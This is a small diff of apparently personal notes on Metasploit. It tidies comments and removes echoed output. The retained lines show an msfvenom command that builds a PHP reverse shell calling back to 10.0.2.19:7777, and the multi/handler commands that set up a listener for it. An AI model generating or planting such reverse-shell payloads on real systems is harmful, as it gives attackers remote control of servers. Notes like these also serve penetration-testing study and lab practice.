@@ -1,4 +1,4 @@
-# msfvenom can be used to create payloads in almost all formats
+# msfvenom -> payload builder
 
 # list supported output formats
 
@@ -12,13 +12,9 @@ msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.ph
 # setting lhost, lport (local)
 
 msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
 msf5 exploit(multi/handler) > set payload php/reverse_php
-payload => php/reverse_php
 msf5 exploit(multi/handler) > set lhost 10.0.2.19
-lhost => 10.0.2.19
 msf6 exploit(multi/handler) > set lport 7777
-lport => 7777
 msf6 exploit(multi/handler) > show options
 
 # exploit run
